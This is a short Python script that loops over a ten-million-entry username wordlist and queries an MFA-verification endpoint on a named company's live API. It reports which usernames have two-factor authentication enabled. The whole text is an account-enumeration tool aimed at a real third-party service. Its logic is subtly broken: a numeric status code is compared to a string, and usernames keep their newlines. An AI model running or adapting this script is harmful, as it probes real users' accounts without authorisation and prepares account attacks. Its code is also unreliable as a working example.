import requests as r
from colorama import Fore


# Request Target With Get Or Post


def req():
    with open(
        r"E:\\Secert\\SecLists-master\\Usernames\\xato-net-10-million-usernames.txt",
        "r",
    ) as file:
        user = file.readlines()
        for f in user:
            method = "GET"
            Url = "https://capig.payfit.com/"
            end_point = "/auth/verify-mfa-setup?username={}".format(f)
            header = {"Content-Type": "application/json"}
            target = r.request(method, url=Url + end_point, headers=header)
            res = target
            if f == "":
                break
            if res.status_code == "200" and '{"enabled":"true"}' in res.text:
                print("User-Name-Has-Enable-2FA" + Fore.BLUE + f)
                break
        else:
            print("Not-Found-User")


req()
